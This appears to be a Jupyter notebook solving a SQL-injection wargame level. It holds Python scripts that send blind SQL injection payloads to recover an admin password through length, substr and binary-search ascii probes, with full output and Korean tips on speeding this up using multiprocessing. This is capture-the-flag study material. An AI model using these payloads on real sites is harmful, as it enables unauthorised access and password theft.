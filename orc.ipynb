{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pytest import param\n",
    "import requests\n",
    "import string\n",
    "string.printable\n",
    "\n",
    "url = \"https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php\"\n",
    "cookies = {\n",
    "    'PHPSESSID' : '1t87momi7f10m7tl6kkv6t0lob'\n",
    "}\n",
    "params = {\n",
    "    'pw': None\n",
    "}\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 비밀번호 길이 구하기"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "' or (id='admin' and length(pw)=0)-- \n",
      "' or (id='admin' and length(pw)=1)-- \n",
      "' or (id='admin' and length(pw)=2)-- \n",
      "' or (id='admin' and length(pw)=3)-- \n",
      "' or (id='admin' and length(pw)=4)-- \n",
      "' or (id='admin' and length(pw)=5)-- \n",
      "' or (id='admin' and length(pw)=6)-- \n",
      "' or (id='admin' and length(pw)=7)-- \n",
      "' or (id='admin' and length(pw)=8)-- \n",
      "find the pw_len 8\n"
     ]
    }
   ],
   "source": [
    "# 비밀번호 길이 구하기\n",
    "for i in range(30):\n",
    "    payload= \"' or (id='admin' and length(pw)={})-- \".format(i)\n",
    "    params['pw'] = payload\n",
    "    print(payload)\n",
    "    response = requests.get(url,params=params,cookies=cookies)\n",
    "    if(\"Hello admin\" in response.text):\n",
    "        print(\"find the pw_len\",i)\n",
    "        break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 패스워드 구하기"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n",
      "\u000b\f\n"
     ]
    }
   ],
   "source": [
    "print(string.printable)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "' or (id='admin' and substr(pw,1,1) = '0')-- \n",
      "find the pw 0\n",
      "' or (id='admin' and substr(pw,2,1) = '0')-- \n",
      "' or (id='admin' and substr(pw,2,1) = '1')-- \n",
      "' or (id='admin' and substr(pw,2,1) = '2')-- \n",
      "' or (id='admin' and substr(pw,2,1) = '3')-- \n",
      "' or (id='admin' and substr(pw,2,1) = '4')-- \n",
      "' or (id='admin' and substr(pw,2,1) = '5')-- \n",
      "' or (id='admin' and substr(pw,2,1) = '6')-- \n",
      "' or (id='admin' and substr(pw,2,1) = '7')-- \n",
      "' or (id='admin' and substr(pw,2,1) = '8')-- \n",
      "' or (id='admin' and substr(pw,2,1) = '9')-- \n",
      "find the pw 09\n",
      "' or (id='admin' and substr(pw,3,1) = '0')-- \n",
      "' or (id='admin' and substr(pw,3,1) = '1')-- \n",
      "' or (id='admin' and substr(pw,3,1) = '2')-- \n",
      "' or (id='admin' and substr(pw,3,1) = '3')-- \n",
      "' or (id='admin' and substr(pw,3,1) = '4')-- \n",
      "' or (id='admin' and substr(pw,3,1) = '5')-- \n",
      "find the pw 095\n",
      "' or (id='admin' and substr(pw,4,1) = '0')-- \n",
      "' or (id='admin' and substr(pw,4,1) = '1')-- \n",
      "' or (id='admin' and substr(pw,4,1) = '2')-- \n",
      "' or (id='admin' and substr(pw,4,1) = '3')-- \n",
      "' or (id='admin' and substr(pw,4,1) = '4')-- \n",
      "' or (id='admin' and substr(pw,4,1) = '5')-- \n",
      "' or (id='admin' and substr(pw,4,1) = '6')-- \n",
      "' or (id='admin' and substr(pw,4,1) = '7')-- \n",
      "' or (id='admin' and substr(pw,4,1) = '8')-- \n",
      "' or (id='admin' and substr(pw,4,1) = '9')-- \n",
      "' or (id='admin' and substr(pw,4,1) = 'a')-- \n",
      "find the pw 095a\n",
      "' or (id='admin' and substr(pw,5,1) = '0')-- \n",
      "' or (id='admin' and substr(pw,5,1) = '1')-- \n",
      "' or (id='admin' and substr(pw,5,1) = '2')-- \n",
      "' or (id='admin' and substr(pw,5,1) = '3')-- \n",
      "' or (id='admin' and substr(pw,5,1) = '4')-- \n",
      "' or (id='admin' and substr(pw,5,1) = '5')-- \n",
      "' or (id='admin' and substr(pw,5,1) = '6')-- \n",
      "' or (id='admin' and substr(pw,5,1) = '7')-- \n",
      "' or (id='admin' and substr(pw,5,1) = '8')-- \n",
      "' or (id='admin' and substr(pw,5,1) = '9')-- \n",
      "find the pw 095a9\n",
      "' or (id='admin' and substr(pw,6,1) = '0')-- \n",
      "' or (id='admin' and substr(pw,6,1) = '1')-- \n",
      "' or (id='admin' and substr(pw,6,1) = '2')-- \n",
      "' or (id='admin' and substr(pw,6,1) = '3')-- \n",
      "' or (id='admin' and substr(pw,6,1) = '4')-- \n",
      "' or (id='admin' and substr(pw,6,1) = '5')-- \n",
      "' or (id='admin' and substr(pw,6,1) = '6')-- \n",
      "' or (id='admin' and substr(pw,6,1) = '7')-- \n",
      "' or (id='admin' and substr(pw,6,1) = '8')-- \n",
      "find the pw 095a98\n",
      "' or (id='admin' and substr(pw,7,1) = '0')-- \n",
      "' or (id='admin' and substr(pw,7,1) = '1')-- \n",
      "' or (id='admin' and substr(pw,7,1) = '2')-- \n",
      "' or (id='admin' and substr(pw,7,1) = '3')-- \n",
      "' or (id='admin' and substr(pw,7,1) = '4')-- \n",
      "' or (id='admin' and substr(pw,7,1) = '5')-- \n",
      "find the pw 095a985\n",
      "' or (id='admin' and substr(pw,8,1) = '0')-- \n",
      "' or (id='admin' and substr(pw,8,1) = '1')-- \n",
      "' or (id='admin' and substr(pw,8,1) = '2')-- \n",
      "find the pw 095a9852\n",
      "answer :  095a9852\n"
     ]
    }
   ],
   "source": [
    "answer = ''\n",
    "for i in range(1,9):\n",
    "    for j in string.printable:\n",
    "        payload = \"' or (id='admin' and substr(pw,{0},1) = '{1}')-- \".format(i,j)\n",
    "        params['pw'] = payload\n",
    "        response = requests.get(url,params=params,cookies=cookies)\n",
    "        print(payload)\n",
    "        if(\"Hello admin\" in response.text):\n",
    "            answer +=j\n",
    "            print(\"find the pw\",answer)\n",
    "#            print(payload)\n",
    "            break\n",
    "print(\"answer : \",answer)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 자잘한 팁 1 \n",
    "### 이진 탐색을 이용하자"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "' or (id='guest' and substr(pw,1,1) = '0')-- \n",
      "' or (id='guest' and substr(pw,1,1) = '1')-- \n",
      "' or (id='guest' and substr(pw,1,1) = '2')-- \n",
      "' or (id='guest' and substr(pw,1,1) = '3')-- \n",
      "' or (id='guest' and substr(pw,1,1) = '4')-- \n",
      "' or (id='guest' and substr(pw,1,1) = '5')-- \n",
      "' or (id='guest' and substr(pw,1,1) = '6')-- \n",
      "' or (id='guest' and substr(pw,1,1) = '7')-- \n",
      "' or (id='guest' and substr(pw,1,1) = '8')-- \n",
      "' or (id='guest' and substr(pw,1,1) = '9')-- \n",
      "' or (id='guest' and substr(pw,1,1) = 'a')-- \n",
      "' or (id='guest' and substr(pw,1,1) = 'b')-- \n",
      "' or (id='guest' and substr(pw,1,1) = 'c')-- \n",
      "' or (id='guest' and substr(pw,1,1) = 'd')-- \n",
      "find the pw d\n",
      "' or (id='guest' and substr(pw,2,1) = '0')-- \n",
      "' or (id='guest' and substr(pw,2,1) = '1')-- \n",
      "' or (id='guest' and substr(pw,2,1) = '2')-- \n",
      "' or (id='guest' and substr(pw,2,1) = '3')-- \n",
      "' or (id='guest' and substr(pw,2,1) = '4')-- \n",
      "' or (id='guest' and substr(pw,2,1) = '5')-- \n",
      "' or (id='guest' and substr(pw,2,1) = '6')-- \n",
      "' or (id='guest' and substr(pw,2,1) = '7')-- \n",
      "' or (id='guest' and substr(pw,2,1) = '8')-- \n",
      "' or (id='guest' and substr(pw,2,1) = '9')-- \n",
      "' or (id='guest' and substr(pw,2,1) = 'a')-- \n",
      "' or (id='guest' and substr(pw,2,1) = 'b')-- \n",
      "' or (id='guest' and substr(pw,2,1) = 'c')-- \n",
      "' or (id='guest' and substr(pw,2,1) = 'd')-- \n",
      "' or (id='guest' and substr(pw,2,1) = 'e')-- \n",
      "' or (id='guest' and substr(pw,2,1) = 'f')-- \n",
      "' or (id='guest' and substr(pw,2,1) = 'g')-- \n",
      "' or (id='guest' and substr(pw,2,1) = 'h')-- \n",
      "' or (id='guest' and substr(pw,2,1) = 'i')-- \n",
      "' or (id='guest' and substr(pw,2,1) = 'j')-- \n",
      "find the pw dj\n",
      "' or (id='guest' and substr(pw,3,1) = '0')-- \n",
      "' or (id='guest' and substr(pw,3,1) = '1')-- \n",
      "' or (id='guest' and substr(pw,3,1) = '2')-- \n",
      "' or (id='guest' and substr(pw,3,1) = '3')-- \n",
      "' or (id='guest' and substr(pw,3,1) = '4')-- \n",
      "' or (id='guest' and substr(pw,3,1) = '5')-- \n",
      "' or (id='guest' and substr(pw,3,1) = '6')-- \n",
      "' or (id='guest' and substr(pw,3,1) = '7')-- \n",
      "' or (id='guest' and substr(pw,3,1) = '8')-- \n",
      "' or (id='guest' and substr(pw,3,1) = '9')-- \n",
      "' or (id='guest' and substr(pw,3,1) = 'a')-- \n",
      "' or (id='guest' and substr(pw,3,1) = 'b')-- \n",
      "' or (id='guest' and substr(pw,3,1) = 'c')-- \n",
      "' or (id='guest' and substr(pw,3,1) = 'd')-- \n",
      "' or (id='guest' and substr(pw,3,1) = 'e')-- \n",
      "' or (id='guest' and substr(pw,3,1) = 'f')-- \n",
      "find the pw djf\n",
      "' or (id='guest' and substr(pw,4,1) = '0')-- \n",
      "' or (id='guest' and substr(pw,4,1) = '1')-- \n",
      "' or (id='guest' and substr(pw,4,1) = '2')-- \n",
      "' or (id='guest' and substr(pw,4,1) = '3')-- \n",
      "' or (id='guest' and substr(pw,4,1) = '4')-- \n",
      "' or (id='guest' and substr(pw,4,1) = '5')-- \n",
      "' or (id='guest' and substr(pw,4,1) = '6')-- \n",
      "' or (id='guest' and substr(pw,4,1) = '7')-- \n",
      "' or (id='guest' and substr(pw,4,1) = '8')-- \n",
      "' or (id='guest' and substr(pw,4,1) = '9')-- \n",
      "' or (id='guest' and substr(pw,4,1) = 'a')-- \n",
      "' or (id='guest' and substr(pw,4,1) = 'b')-- \n",
      "' or (id='guest' and substr(pw,4,1) = 'c')-- \n",
      "' or (id='guest' and substr(pw,4,1) = 'd')-- \n",
      "' or (id='guest' and substr(pw,4,1) = 'e')-- \n",
      "' or (id='guest' and substr(pw,4,1) = 'f')-- \n",
      "' or (id='guest' and substr(pw,4,1) = 'g')-- \n",
      "' or (id='guest' and substr(pw,4,1) = 'h')-- \n",
      "' or (id='guest' and substr(pw,4,1) = 'i')-- \n",
      "' or (id='guest' and substr(pw,4,1) = 'j')-- \n",
      "' or (id='guest' and substr(pw,4,1) = 'k')-- \n",
      "find the pw djfk\n",
      "answer :  djfk\n"
     ]
    }
   ],
   "source": [
    "answer = ''\n",
    "for i in range(1,5):\n",
    "    for j in string.printable:\n",
    "        payload = \"' or (id='guest' and substr(pw,{0},1) = '{1}')-- \".format(i,j)\n",
    "        params['pw'] = payload\n",
    "        response = requests.get(url,params=params,cookies=cookies)\n",
    "        print(payload)\n",
    "        if(\"Hello admin\" in response.text):\n",
    "            answer +=j\n",
    "            print(\"find the pw\",answer)\n",
    "#            print(payload)\n",
    "            break\n",
    "print(\"answer : \",answer)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "' or id='guest' and ascii(substr(pw,1,1)) <= 127#\n",
      "' or id='guest' and ascii(substr(pw,1,1)) = 127#\n",
      "' or id='guest' and ascii(substr(pw,1,1)) <= 63#\n",
      "' or id='guest' and ascii(substr(pw,1,1)) <= 95#\n",
      "' or id='guest' and ascii(substr(pw,1,1)) <= 111#\n",
      "' or id='guest' and ascii(substr(pw,1,1)) = 111#\n",
      "' or id='guest' and ascii(substr(pw,1,1)) <= 103#\n",
      "' or id='guest' and ascii(substr(pw,1,1)) = 103#\n",
      "' or id='guest' and ascii(substr(pw,1,1)) <= 99#\n",
      "' or id='guest' and ascii(substr(pw,1,1)) <= 101#\n",
      "' or id='guest' and ascii(substr(pw,1,1)) = 101#\n",
      "' or id='guest' and ascii(substr(pw,1,1)) <= 100#\n",
      "' or id='guest' and ascii(substr(pw,1,1)) = 100#\n",
      "find the pw d\n",
      "' or id='guest' and ascii(substr(pw,2,1)) <= 127#\n",
      "' or id='guest' and ascii(substr(pw,2,1)) = 127#\n",
      "' or id='guest' and ascii(substr(pw,2,1)) <= 63#\n",
      "' or id='guest' and ascii(substr(pw,2,1)) <= 95#\n",
      "' or id='guest' and ascii(substr(pw,2,1)) <= 111#\n",
      "' or id='guest' and ascii(substr(pw,2,1)) = 111#\n",
      "' or id='guest' and ascii(substr(pw,2,1)) <= 103#\n",
      "' or id='guest' and ascii(substr(pw,2,1)) <= 107#\n",
      "' or id='guest' and ascii(substr(pw,2,1)) = 107#\n",
      "' or id='guest' and ascii(substr(pw,2,1)) <= 105#\n",
      "' or id='guest' and ascii(substr(pw,2,1)) <= 106#\n",
      "' or id='guest' and ascii(substr(pw,2,1)) = 106#\n",
      "find the pw dj\n",
      "' or id='guest' and ascii(substr(pw,3,1)) <= 127#\n",
      "' or id='guest' and ascii(substr(pw,3,1)) = 127#\n",
      "' or id='guest' and ascii(substr(pw,3,1)) <= 63#\n",
      "' or id='guest' and ascii(substr(pw,3,1)) <= 95#\n",
      "' or id='guest' and ascii(substr(pw,3,1)) <= 111#\n",
      "' or id='guest' and ascii(substr(pw,3,1)) = 111#\n",
      "' or id='guest' and ascii(substr(pw,3,1)) <= 103#\n",
      "' or id='guest' and ascii(substr(pw,3,1)) = 103#\n",
      "' or id='guest' and ascii(substr(pw,3,1)) <= 99#\n",
      "' or id='guest' and ascii(substr(pw,3,1)) <= 101#\n",
      "' or id='guest' and ascii(substr(pw,3,1)) <= 102#\n",
      "' or id='guest' and ascii(substr(pw,3,1)) = 102#\n",
      "find the pw djf\n",
      "' or id='guest' and ascii(substr(pw,4,1)) <= 127#\n",
      "' or id='guest' and ascii(substr(pw,4,1)) = 127#\n",
      "' or id='guest' and ascii(substr(pw,4,1)) <= 63#\n",
      "' or id='guest' and ascii(substr(pw,4,1)) <= 95#\n",
      "' or id='guest' and ascii(substr(pw,4,1)) <= 111#\n",
      "' or id='guest' and ascii(substr(pw,4,1)) = 111#\n",
      "' or id='guest' and ascii(substr(pw,4,1)) <= 103#\n",
      "' or id='guest' and ascii(substr(pw,4,1)) <= 107#\n",
      "' or id='guest' and ascii(substr(pw,4,1)) = 107#\n",
      "find the pw djfk\n"
     ]
    }
   ],
   "source": [
    "answer = ''\n",
    "for i in range(1,5):\n",
    "    start,end=0,255\n",
    "    while True:\n",
    "        search = int((start + end)/2)\n",
    "        payload = \"' or id='guest' and ascii(substr(pw,{},1)) <= {}#\".format(i,search)\n",
    "        params['pw'] = payload\n",
    "        print(payload)\n",
    "        response = requests.get(url,params=params,cookies=cookies)\n",
    "        if(\"Hello admin\" in response.text):\n",
    "            payload = \"' or id='guest' and ascii(substr(pw,{},1)) = {}#\".format(i,search)\n",
    "            params['pw'] = payload\n",
    "            print(payload)\n",
    "            response = requests.get(url,params=params,cookies=cookies)\n",
    "            if(\"Hello admin\" in response.text):\n",
    "                answer += chr(search)\n",
    "                print(\"find the pw\",answer)\n",
    "                break\n",
    "            end = search\n",
    "        else:\n",
    "            start = search\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 기본 반복문 -> 이진탐색 사용시 2배 이상 빨라짐\n",
    "지금 처럼 비밀번호가 8자리인 경우에는 반복문을 사용해도 되지만,\n",
    "\n",
    "30자리 정도 되는 문제가 나왔을 때는 이진탐색을 이용"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 이것보다 더 빠르게 답을 구하고 싶다면?\n",
    "멀티프로세싱을 이용해 보기 "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "djfk"
     ]
    }
   ],
   "source": [
    "from worker import worker\n",
    "from multiprocessing import Pool\n",
    "if __name__=='__main__':\n",
    "    p = Pool()\n",
    "    with Pool(4) as p:\n",
    "        ret = p.map(worker,[i for i in range(1,5)])\n",
    "    for i in ret:\n",
    "        print(i,end='')\n",
    "         "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "하나의 프로세스에서 반복문 4번 실행하는걸 병렬 처리를 위해 4개의 프로세스로 분리\n",
    "기존 14.4s -> 4.4s로 단축 (약 3.5배 빨라짐)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "정리하면 그냥 반복문 25초 -> 이진탐색 14초 -> 멀티 프로세싱 4초로 단축이 가능하다!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  }
 ],
 "metadata": {
  "interpreter": {
   "hash": "2017445a548f742d64dcb059c3b75282e74fed8cc15f4c420993e78f71bf7550"
  },
  "kernelspec": {
   "display_name": "Python 3.8.8 ('base')",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
